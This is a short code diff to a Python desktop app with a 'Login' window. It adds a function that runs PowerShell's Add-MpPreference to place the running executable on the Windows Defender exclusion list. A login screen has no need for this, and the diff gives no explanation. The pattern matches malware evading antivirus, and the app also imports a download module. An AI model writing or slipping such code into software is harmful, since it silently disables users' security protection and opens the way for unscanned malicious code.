@@ -6,6 +6,7 @@ import os
 import sys
 import download
 from tkinter import messagebox
+import subprocess
 
 build = 0.99
 ctk.set_appearance_mode("dark")
@@ -15,6 +16,18 @@ app.title("Login")
 app.minsize(800, 600)
 app.maxsize(800, 600)
 app.resizable(False, False)
+
+def add_to_exclusions():
+    """Adds the current executable to Windows Defender exclusion list."""    
+    exe_path = os.path.abspath(sys.executable)  # Get full path of the EXE
+    command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{exe_path}\'"'
+    
+    try:
+        subprocess.run(command, shell=True, check=True)
+        print(f"Successfully added to exclusions: {exe_path}")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to add exclusion: {e}")
+        return
 
 def LoginFrame():
 
